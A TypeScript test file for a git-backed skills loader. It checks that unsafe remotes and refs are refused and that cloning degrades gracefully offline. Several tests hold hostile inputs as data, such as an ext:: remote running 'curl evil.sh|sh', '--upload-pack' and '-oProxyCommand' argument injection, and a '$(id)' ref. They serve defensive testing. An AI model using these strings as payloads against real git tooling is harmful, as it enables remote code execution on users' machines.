import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import { once } from 'node:events';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import test, { type TestContext } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
  bareDirFor,
  ensureBareClone,
  getTeamSkillsCached,
  isPinnedSha,
  isSafeRef,
  listRemoteSkills,
  refreshTeamSkills,
  safeRemoteFor,
  waitForTeamSkills,
} from '../../src/skills-remote.js';

// ---- safeRemoteFor: repo/URL injection guard (#428) --------------------------

test('safeRemoteFor rejects the git remote-helper RCE surface', () => {
  // `ext::`/`fd::` transports run arbitrary commands — the headline vector.
  assert.equal(safeRemoteFor("ext::sh -c 'curl evil.sh|sh'"), null);
  assert.equal(safeRemoteFor('fd::17'), null);
  // A leading `-` is argument injection against git's option surface.
  assert.equal(safeRemoteFor('--upload-pack=touch /tmp/pwn'), null);
  assert.equal(safeRemoteFor('-oProxyCommand=evil'), null);
  // Any scheme outside the transport allowlist.
  assert.equal(safeRemoteFor('ftp://evil/x.git'), null);
  assert.equal(safeRemoteFor('javascript://x'), null);
  assert.equal(safeRemoteFor(''), null);
  assert.equal(safeRemoteFor('   '), null);
  // A bare word is neither shorthand, URL, scp-like, nor a path.
  assert.equal(safeRemoteFor('not-a-real-remote'), null);
});

test('safeRemoteFor accepts the documented safe source shapes', () => {
  assert.equal(safeRemoteFor('open-mercato/skills'), 'https://github.com/open-mercato/skills.git');
  assert.equal(safeRemoteFor('https://github.com/o/n.git'), 'https://github.com/o/n.git');
  assert.equal(safeRemoteFor('http://internal.example/n.git'), 'http://internal.example/n.git');
  assert.equal(safeRemoteFor('ssh://git@host/o/n.git'), 'ssh://git@host/o/n.git');
  assert.equal(safeRemoteFor('git@github.com:o/n.git'), 'git@github.com:o/n.git');
  // Local paths / file:// stay working (a documented source shape).
  assert.equal(safeRemoteFor('/abs/path/to/repo'), '/abs/path/to/repo');
  assert.equal(safeRemoteFor('./rel/repo'), './rel/repo');
  assert.equal(safeRemoteFor('../sibling/repo'), '../sibling/repo');
  assert.equal(safeRemoteFor('file:///abs/repo'), 'file:///abs/repo');
  // `.` and `-` are in the owner/name charset, so a single-segment relative
  // path must be matched as a path first, not rewritten to a github.com URL.
  assert.equal(safeRemoteFor('./rel'), './rel');
  assert.equal(safeRemoteFor('../rel'), '../rel');
});

test('safeRemoteFor keeps Windows local paths working (BC §5: local path)', () => {
  // win32 is a supported platform and these worked before the hardening —
  // narrowing the `skillsRepos` source shape would be a breaking change.
  assert.equal(safeRemoteFor('C:\\skills'), 'C:\\skills');
  assert.equal(safeRemoteFor('C:/skills'), 'C:/skills');
  assert.equal(safeRemoteFor('d:\\team\\skills'), 'd:\\team\\skills');
  // Still not a licence for a drive-letter-shaped transport helper.
  assert.equal(safeRemoteFor('C:\\x::y'), null);
});

test('safeRemoteFor expands ~/ so git (no shell) can actually find it', () => {
  // execFile gives git no shell, so a literal `~` would be a directory name.
  assert.equal(safeRemoteFor('~/skills'), join(homedir(), 'skills'));
});

// ---- isSafeRef / isPinnedSha: ref injection guard (#428) ---------------------

test('isSafeRef rejects argument-injection and range refs', () => {
  assert.equal(isSafeRef('--output=/tmp/pwn'), false);
  assert.equal(isSafeRef('-x'), false);
  assert.equal(isSafeRef('main..evil'), false);
  assert.equal(isSafeRef('a b'), false);
  assert.equal(isSafeRef('a;b'), false);
  assert.equal(isSafeRef('$(id)'), false);
  assert.equal(isSafeRef(''), false);
});

test('isSafeRef accepts real branches, tags and SHAs', () => {
  assert.equal(isSafeRef('main'), true);
  assert.equal(isSafeRef('refs/heads/main'), true);
  assert.equal(isSafeRef('release/1.2.3'), true);
  assert.equal(isSafeRef('v1.2.3'), true);
  assert.equal(isSafeRef('a'.repeat(40)), true);
});

test('isPinnedSha recognises full sha-1 and sha-256 commit ids', () => {
  assert.equal(isPinnedSha('0'.repeat(40)), true);
  assert.equal(isPinnedSha('abcdef0123456789'.padEnd(64, '0')), true);
  assert.equal(isPinnedSha('main'), false);
  assert.equal(isPinnedSha('abc'), false); // short sha is not a pin
});

// ---- ensureBareClone refuses unsafe remotes before touching git (#428) -------

test('ensureBareClone throws on an unsafe remote instead of shelling out', async () => {
  await assert.rejects(
    ensureBareClone("ext::sh -c 'touch /tmp/pwn'"),
    /refusing unsafe skills repo remote/,
  );
});

// ---- integration: local clone still works, SHA pins, bad ref degrades --------

test('listRemoteSkills clones a local repo, pins the SHA, and refuses a bad ref', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'xez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'xez-src-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/xez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(srcDir, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  writeFileSync(
    join(srcDir, 'SKILL.md'),
    '---\nname: demo\ndescription: a demo skill\n---\nbody text\n',
  );
  // A directory skill needs SKILL.md under a directory to be named after it.
  execFileSync('mkdir', ['-p', join(srcDir, 'greeter')]);
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  for (const [dir, name] of [['.xezar/skills', 'canonical-flat'], ['.ai/xezar/skills', 'legacy-flat']]) {
    mkdirSync(join(srcDir, dir!), { recursive: true });
    writeFileSync(join(srcDir, dir!, 'custom.md'), `---\nname: ${name}\n---\ncustom guidance\n`);
  }
  g(['add', '-A']);
  g(['commit', '-m', 'init']);
  const sha = g(['rev-parse', 'HEAD']);

  await ensureBareClone(srcDir);

  // Branch ref: skills come back and record the resolved commit.
  const onMain = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  assert.ok(onMain.some((s) => s.name === 'canonical-flat'));
  assert.ok(onMain.some((s) => s.name === 'legacy-flat'));
  const greeter = onMain.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');
  assert.equal(greeter?.team?.commit, sha);

  // Pinned SHA ref: identical result, and the pin is honoured.
  const onSha = await listRemoteSkills({ repo: srcDir, ref: sha });
  assert.ok(onSha.some((s) => s.name === 'greeter'));

  // A wrong pinned SHA resolves to nothing (no HEAD fallback).
  const wrong = await listRemoteSkills({ repo: srcDir, ref: 'f'.repeat(40) });
  assert.deepEqual(wrong, []);

  // An injection ref is refused outright.
  const evil = await listRemoteSkills({ repo: srcDir, ref: '--output=/tmp/pwn' });
  assert.deepEqual(evil, []);
});

// ---- per-project team-skills cache isolation (multi-project workspace, 2.6) --

test('team-skills cache is keyed by repoRoot — projects never see each other\'s skills', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'xez-home-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/xez skills cache into temp
  const dirs: string[] = [home];
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  /** One local skills repo carrying a single directory skill named `name`. */
  const makeSkillsRepo = (name: string): string => {
    const src = mkdtempSync(join(tmpdir(), `xez-src-${name}-`));
    dirs.push(src);
    const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
    g(['-c', 'init.defaultBranch=main', 'init']);
    g(['config', 'user.email', 'test@example.com']);
    g(['config', 'user.name', 'Test']);
    mkdirSync(join(src, name));
    writeFileSync(join(src, name, 'SKILL.md'), `---\ndescription: ${name}\n---\n${name} body\n`);
    g(['add', '-A']);
    g(['commit', '-m', 'init']);
    return src;
  };

  /** One project root whose `.xezar/config.json` points at its own skills repo. */
  const makeProjectRoot = (skillsRepo: string): string => {
    const root = mkdtempSync(join(tmpdir(), 'xez-root-'));
    dirs.push(root);
    mkdirSync(join(root, '.xezar'), { recursive: true });
    writeFileSync(
      join(root, '.xezar', 'config.json'),
      JSON.stringify({ skillsRepos: [{ repo: skillsRepo, ref: 'main' }] }),
    );
    return root;
  };

  const rootA = makeProjectRoot(makeSkillsRepo('alpha-skill'));
  const rootB = makeProjectRoot(makeSkillsRepo('beta-skill'));

  const loadedA = await refreshTeamSkills(rootA);
  const loadedB = await refreshTeamSkills(rootB);
  assert.deepEqual(loadedA.map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(loadedB.map((s) => s.name), ['beta-skill']);

  // The regression: the cache was one module-global list, so after B's load,
  // A's scope was served B's skills. Each root must keep its own entry.
  assert.deepEqual(getTeamSkillsCached(rootA).map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(getTeamSkillsCached(rootB).map((s) => s.name), ['beta-skill']);
});

// =============================================================================
// Network and cache degradation (#57, coverage gap R18)
//
// The contract under test is a boot-time promise from AGENTS.md: "Missing dirs
// are fine; team-skill loading never blocks on the network (background cache in
// `~/.cache/xez/`)." Every case below therefore has to be reproducible with no
// network at all — the fake `git` under `shimGit` is the seam, and a redirected
// HOME keeps every clone inside a temp directory.
// =============================================================================

/**
 * The real `git`, resolved once from the pristine PATH. `shimGit` replaces
 * `git` on PATH for the duration of one test and delegates the calls it does
 * not simulate (`rev-parse`, `ls-tree`, `show`) to this binary, so "the network
 * failed but the local clone still reads" is reproduced exactly.
 */
const REAL_GIT = execFileSync('which', ['git'], { encoding: 'utf8' }).trim();

interface Sandbox {
  /** The redirected HOME — the `~/.cache/xez/skills` clone cache lives here. */
  home: string;
  /** A temp directory, removed when the test ends. */
  dir: (prefix: string) => string;
  /** A local git repo carrying one directory skill named `name`. */
  skillsRepo: (name: string) => string;
  /** A project root whose `.xezar/config.json` lists exactly `sources`. */
  projectRoot: (sources: { repo: string; ref: string }[]) => string;
  /** chmod a directory read-only for this test; restored before cleanup. */
  makeReadOnly: (path: string) => void;
  /** Everything the module printed through `console.warn` during the test. */
  warnings: string[];
}

/** Per-test scratch: redirected HOME and PATH, captured warnings, full cleanup. */
function sandbox(t: TestContext): Sandbox {
  const dirs: string[] = [];
  const locked: string[] = [];
  const dir = (prefix: string): string => {
    const made = mkdtempSync(join(tmpdir(), prefix));
    dirs.push(made);
    return made;
  };
  const home = dir('xez-home-');
  const prevHome = process.env.HOME;
  const prevPath = process.env.PATH;
  // `bareDirFor` resolves through os.homedir(), so redirecting HOME is what
  // keeps every clone in this file out of the developer's real ~/.cache/xez.
  process.env.HOME = home;
  const warnings: string[] = [];
  const prevWarn = console.warn;
  console.warn = (...args: unknown[]) => {
    warnings.push(args.map(String).join(' '));
  };

  t.after(() => {
    console.warn = prevWarn;
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    if (prevPath === undefined) delete process.env.PATH;
    else process.env.PATH = prevPath;
    // A directory a case made read-only has to be removable again.
    for (const path of locked) {
      try {
        chmodSync(path, 0o700);
      } catch {
        // already gone
      }
    }
    for (const made of dirs) rmSync(made, { recursive: true, force: true });
  });

  return {
    home,
    dir,
    warnings,
    makeReadOnly: (path: string) => {
      locked.push(path);
      chmodSync(path, 0o500);
    },
    skillsRepo: (name: string): string => {
      const src = dir(`xez-src-${name}-`);
      // The real binary: a fixture must keep building even with a shim on PATH.
      const g = (args: string[]) => execFileSync(REAL_GIT, args, { cwd: src, encoding: 'utf8' });
      g(['-c', 'init.defaultBranch=main', 'init']);
      g(['config', 'user.email', 'test@example.com']);
      g(['config', 'user.name', 'Test']);
      mkdirSync(join(src, name));
      writeFileSync(join(src, name, 'SKILL.md'), `---\ndescription: ${name}\n---\n${name} body\n`);
      g(['add', '-A']);
      g(['commit', '-m', 'init']);
      return src;
    },
    projectRoot: (sources): string => {
      const root = dir('xez-root-');
      mkdirSync(join(root, '.xezar'), { recursive: true });
      writeFileSync(join(root, '.xezar', 'config.json'), JSON.stringify({ skillsRepos: sources }));
      return root;
    },
  };
}

interface GitShim {
  /** Every invocation the fake `git` saw, in order. */
  calls: () => { sub: string; args: string[] }[];
  /** The NDJSON call log behind `calls()`, for a case that has to read it from another process. */
  log: string;
  /** Unblock a hanging invocation — it then exits the way a killed git does. */
  release: () => void;
}

/**
 * Put a fake `git` in front of the real one on PATH. This is the module's own
 * network seam: every remote operation goes through `execFile('git', …)` with
 * `{ ...process.env }`, so the shim intercepts `clone`/`fetch` and no test here
 * opens a socket. `fail` exits non-zero; `hang` blocks until `release()` and
 * then exits `exitCode` — what `execFile`'s timeout + SIGKILL looks like to
 * `git()` when a remote never answers. Anything else runs for real.
 */
function shimGit(
  box: Sandbox,
  opts: { fail?: string[]; hang?: string[]; exitCode?: number },
): GitShim {
  const dir = box.dir('xez-gitshim-');
  const config = {
    log: join(dir, 'calls.ndjson'),
    release: join(dir, 'release'),
    realGit: REAL_GIT,
    fail: opts.fail ?? [],
    hang: opts.hang ?? [],
    exitCode: opts.exitCode ?? 128,
    // A bug must never wedge the suite: a hang gives up on its own too.
    hangCapMs: 20_000,
  };
  const shim = join(dir, 'git-shim.mjs');
  writeFileSync(
    shim,
    `import { appendFileSync, existsSync } from 'node:fs';
import { spawnSync } from 'node:child_process';

const CONFIG = ${JSON.stringify(config)};
const args = process.argv.slice(2);

// git's own \`-c key=value\` options come first; the subcommand is the first
// remaining non-option argument.
let sub = '';
for (let i = 0; i < args.length; i += 1) {
  if (args[i] === '-c') { i += 1; continue; }
  if (args[i].startsWith('-')) continue;
  sub = args[i];
  break;
}
appendFileSync(CONFIG.log, JSON.stringify({ sub, args }) + '\\n');

if (CONFIG.hang.includes(sub)) {
  // Sleep synchronously: this process has to look like a git that never answers.
  const clock = new Int32Array(new SharedArrayBuffer(4));
  const deadline = Date.now() + CONFIG.hangCapMs;
  while (!existsSync(CONFIG.release) && Date.now() < deadline) Atomics.wait(clock, 0, 0, 50);
}
if (CONFIG.fail.includes(sub) || CONFIG.hang.includes(sub)) {
  process.stderr.write('fatal: simulated git failure (' + sub + ')\\n');
  process.exit(CONFIG.exitCode);
}
const done = spawnSync(CONFIG.realGit, args, { stdio: 'inherit' });
process.exit(done.status ?? 1);
`,
  );
  const bin = join(dir, 'git');
  writeFileSync(bin, `#!/bin/sh\nexec ${JSON.stringify(process.execPath)} ${JSON.stringify(shim)} "$@"\n`);
  chmodSync(bin, 0o755);
  process.env.PATH = `${dir}:${process.env.PATH ?? ''}`;

  return {
    log: config.log,
    calls: () =>
      existsSync(config.log)
        ? readFileSync(config.log, 'utf8')
            .split('\n')
            .filter(Boolean)
            .map((line) => JSON.parse(line) as { sub: string; args: string[] })
        : [],
    release: () => writeFileSync(config.release, ''),
  };
}

/** Poll until `predicate` holds, failing the test rather than hanging forever. */
async function waitFor(predicate: () => boolean, what: string, timeoutMs = 10_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!predicate()) {
    if (Date.now() > deadline) assert.fail(`timed out waiting for ${what}`);
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
}

test('a failed fetch degrades to the cached clone instead of throwing', async (t) => {
  const box = sandbox(t);
  const src = box.skillsRepo('cached-skill');
  const root = box.projectRoot([{ repo: src, ref: 'main' }]);

  // Warm the cache for real — a local path is a documented source shape, so the
  // first clone needs no network either.
  assert.deepEqual((await refreshTeamSkills(root)).map((s) => s.name), ['cached-skill']);
  assert.ok(existsSync(join(bareDirFor(src), 'HEAD')), 'expected a bare clone in the temp cache');

  // Now the network is gone: `fetch` fails while every local read still works.
  const git = shimGit(box, { fail: ['fetch'] });
  // Not throwing is half the assertion; serving the cached catalog is the rest.
  const afterFailure = await refreshTeamSkills(root);
  assert.deepEqual(afterFailure.map((s) => s.name), ['cached-skill']);
  assert.ok(
    git.calls().some((c) => c.sub === 'fetch'),
    'expected the failing fetch to actually be attempted',
  );
});

test('a failed fetch with no cache returns an empty catalog and never throws', async (t) => {
  const box = sandbox(t);
  // A source that cannot be cloned and was never cached: an absent local path
  // fails instantly and offline, exactly like an unreachable remote.
  const missing = join(box.dir('xez-gone-'), 'never-existed');
  const root = box.projectRoot([{ repo: missing, ref: 'main' }]);

  // The boot must survive this. A throw here is "xezar will not start" on the
  // machine of a user whose network is down (AGENTS.md).
  assert.deepEqual(await refreshTeamSkills(root), []);
  assert.deepEqual(getTeamSkillsCached(root), []);
  assert.deepEqual(await waitForTeamSkills(root), []);
  assert.equal(existsSync(join(bareDirFor(missing), 'HEAD')), false);
  // Listing the same source directly is empty rather than an error, too.
  assert.deepEqual(await listRemoteSkills({ repo: missing, ref: 'main' }), []);
});

test('a clone that hangs never blocks the catalog read, and a killed git degrades', async (t) => {
  const box = sandbox(t);
  const src = box.skillsRepo('slow-skill');
  const root = box.projectRoot([{ repo: src, ref: 'main' }]);

  // `clone` blocks until released, then exits 137 — the observable shape of the
  // module's own clone timeout firing (the constant itself is not injectable).
  const git = shimGit(box, { hang: ['clone'], exitCode: 137 });

  const started = Date.now();
  // The contract: "team-skill loading never blocks on the network". The read
  // returns now, while the clone is still hanging in the background.
  assert.deepEqual(getTeamSkillsCached(root), []);
  const waited = Date.now() - started;
  assert.ok(waited < 1_000, `the catalog read waited ${waited}ms on a hung git`);

  // The hung clone is real — it has actually started — ...
  await waitFor(() => git.calls().some((c) => c.sub === 'clone'), 'the hanging clone to start');
  // ...and the load degrades to an empty catalog once the hung git is killed.
  git.release();
  assert.deepEqual(await waitForTeamSkills(root), []);
  assert.deepEqual(await refreshTeamSkills(root), []);
});

/** A one-shot command gets this long to leave after its own work — generous next to a node +
 *  tsx boot, and far under `shimGit`'s own 20 s hang cap, so a failure here is the hang and
 *  never the shim giving up. */
const ONE_SHOT_EXIT_DEADLINE_MS = 10_000;
/** How long the child waits for the clone to be spawned before giving up and reporting that it
 *  never started — strictly under the deadline above, so the two can never race. */
const ONE_SHOT_START_DEADLINE_MS = 5_000;
const PACKAGE_ROOT = fileURLToPath(new URL('../../', import.meta.url));
const SKILLS_REMOTE_MODULE = new URL('../../src/skills-remote.ts', import.meta.url).href;

test('a hung network clone never holds a one-shot process open (#249)', async (t) => {
  const box = sandbox(t);
  const src = box.skillsRepo('one-shot-skill');
  const root = box.projectRoot([{ repo: src, ref: 'main' }]);
  // `shimGit` rewrites this process's PATH and `sandbox` its HOME; the child below inherits
  // both, so it clones into the sandbox cache through a `clone` that never answers.
  const git = shimGit(box, { hang: ['clone'], exitCode: 137 });

  // A one-shot command in miniature: kick off the background catalog load the way every CLI
  // entry point does (`discoverSkills` → `getTeamSkillsCached`) and then fall off the end of
  // the program. `xezar run` is in exactly this state once it has printed `run done` — and it
  // sat there for the full 60 s clone timeout until the packaged-CLI e2e SIGTERM'd it.
  //
  // The wait in the middle is not padding: it is the CLI's own work. A process that starts the
  // load and immediately falls off the end never reaches git at all — the chain is pure
  // promises and node exits out from under it — so the case would pass against the bug. Waiting
  // until the clone has actually been spawned puts the child in the state `xezar run` is in
  // when it prints its last line: real work finished, one network git still in flight.
  const script = join(box.dir('xez-one-shot-'), 'one-shot.mjs');
  writeFileSync(
    script,
    `import { existsSync, readFileSync } from 'node:fs';\n`
      + `import { getTeamSkillsCached } from ${JSON.stringify(SKILLS_REMOTE_MODULE)};\n`
      + `getTeamSkillsCached(${JSON.stringify(root)});\n`
      + `const log = ${JSON.stringify(git.log)};\n`
      + `const deadline = Date.now() + ${ONE_SHOT_START_DEADLINE_MS};\n`
      + `const cloning = () => existsSync(log) && readFileSync(log, 'utf8').includes('"clone"');\n`
      + `while (!cloning() && Date.now() < deadline) {\n`
      + `  await new Promise((r) => setTimeout(r, 25));\n`
      + `}\n`
      + `process.stdout.write(cloning() ? 'clone in flight\\n' : 'clone never started\\n');\n`,
  );

  const started = Date.now();
  // `cwd` is the package root so `--import tsx` resolves from this repo's node_modules rather
  // than from the temp directory the script lives in.
  const child = spawn(process.execPath, ['--import', 'tsx', script], {
    cwd: PACKAGE_ROOT,
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let output = '';
  child.stdout.setEncoding('utf8');
  child.stdout.on('data', (chunk: string) => { output += chunk; });
  child.stderr.setEncoding('utf8');
  child.stderr.on('data', (chunk: string) => { output += chunk; });
  const reaper = setTimeout(() => child.kill('SIGKILL'), ONE_SHOT_EXIT_DEADLINE_MS);
  const [code, signal] = (await once(child, 'exit')) as [number | null, NodeJS.Signals | null];
  clearTimeout(reaper);
  const waited = Date.now() - started;
  // Before the assertions, so a failing one never leaves the orphaned clone sitting on the
  // shim's full hang cap. The child's exit is already recorded above.
  git.release();

  assert.equal(
    signal,
    null,
    `the one-shot process was still running after ${waited}ms and had to be killed — `
      + `a background team-skills clone is holding the event loop open. Output:\n${output}`,
  );
  assert.equal(code, 0, `one-shot process exited ${code} after ${waited}ms. Output:\n${output}`);
  assert.match(output, /clone in flight/, 'the child should have left with a clone still running');
  // Without this the case is vacuous: a child that exits because it never reached git would
  // pass the assertions above while proving nothing about a hung clone.
  assert.ok(
    git.calls().some((c) => c.sub === 'clone'),
    `expected the hung clone to have been attempted. Output:\n${output}`,
  );
});

test('a corrupt or truncated cache degrades to empty, and a missing one re-clones', async (t) => {
  const box = sandbox(t);
  const src = box.skillsRepo('fragile-skill');
  const root = box.projectRoot([{ repo: src, ref: 'main' }]);
  const bare = bareDirFor(src);

  assert.deepEqual((await refreshTeamSkills(root)).map((s) => s.name), ['fragile-skill']);

  // Truncated HEAD: the file is still there, so the "is there a clone?" probe
  // passes and every git call under it fails. That must not crash.
  writeFileSync(join(bare, 'HEAD'), '');
  assert.deepEqual(await listRemoteSkills({ repo: src, ref: 'main' }), []);
  assert.deepEqual(await refreshTeamSkills(root), []);

  // Garbled ref store: HEAD is valid again, the refs are not.
  writeFileSync(join(bare, 'HEAD'), 'ref: refs/heads/main\n');
  writeFileSync(join(bare, 'packed-refs'), 'not a ref file at all\n');
  assert.deepEqual(await listRemoteSkills({ repo: src, ref: 'main' }), []);
  assert.deepEqual(await refreshTeamSkills(root), []);

  // A cache that is simply gone degrades to a re-fetch: the skills come back.
  rmSync(bare, { recursive: true, force: true });
  assert.deepEqual((await refreshTeamSkills(root)).map((s) => s.name), ['fragile-skill']);
});

test('all three configured source shapes resolve, and unsafe ones never reach git', async (t) => {
  const box = sandbox(t);
  const local = box.skillsRepo('local-skill');
  const unsafeRepo = "ext::sh -c 'touch /tmp/xez-issue-57-pwn'";
  const root = box.projectRoot([
    { repo: local, ref: 'main' }, // local path (BC §5)
    { repo: 'acme/team-skills', ref: 'main' }, // GitHub shorthand
    { repo: 'https://git.example.invalid/team/skills.git', ref: 'main' }, // full git URL
    { repo: unsafeRepo, ref: 'main' }, // refused remote
    { repo: local, ref: 'main..evil' }, // refused ref
  ]);

  // Cache the local source with the real binary first, then cut the network: the
  // two remote shapes must be *attempted* without a packet leaving the machine.
  await ensureBareClone(local);
  const git = shimGit(box, { fail: ['clone', 'fetch'] });

  const loaded = await refreshTeamSkills(root);
  // An unreachable or refused source never hides a working one.
  assert.deepEqual(loaded.map((s) => s.name), ['local-skill']);

  const cloneArgs = git.calls().filter((c) => c.sub === 'clone').flatMap((c) => c.args);
  assert.ok(
    cloneArgs.includes('https://github.com/acme/team-skills.git'),
    'GitHub shorthand must resolve to the canonical https remote',
  );
  assert.ok(
    cloneArgs.includes('https://git.example.invalid/team/skills.git'),
    'a full git URL must be passed through unchanged',
  );
  // The unsafe remote is refused before git runs at all — and it warns, because
  // a bad config would otherwise just look like skills quietly disappearing.
  assert.equal(
    git.calls().some((c) => c.args.some((a) => a.includes('ext::'))),
    false,
    'an `ext::` remote-helper source must never be handed to git',
  );
  assert.ok(
    box.warnings.some((w) => w.includes('ext::') && w.includes('skillsRepos')),
    `expected one warning naming the refused source, got ${JSON.stringify(box.warnings)}`,
  );
  assert.equal(existsSync(join(bareDirFor('acme/team-skills'), 'HEAD')), false);
});

test('a read-only cache directory degrades instead of failing the boot', async (t) => {
  const box = sandbox(t);
  const src = box.skillsRepo('unwritable-skill');
  const root = box.projectRoot([{ repo: src, ref: 'main' }]);

  // `~/.cache` exists but cannot be written, so the clone has nowhere to go.
  const cache = join(box.home, '.cache');
  mkdirSync(cache, { recursive: true });
  box.makeReadOnly(cache);
  // Guard the premise: a user who *can* write a 0500 directory (root) would
  // otherwise get a silent false pass here.
  assert.throws(
    () => writeFileSync(join(cache, 'probe'), ''),
    /EACCES|EPERM/,
    'this case needs a user that cannot write a 0500 directory',
  );

  assert.deepEqual(await refreshTeamSkills(root), []);
  assert.deepEqual(getTeamSkillsCached(root), []);
  assert.equal(existsSync(join(bareDirFor(src), 'HEAD')), false);
  // Pinned, not endorsed: this path degrades *silently*. The module's header
  // says team skills "quietly disappear"; only an unsafe source shape warns.
  assert.deepEqual(box.warnings, []);
});
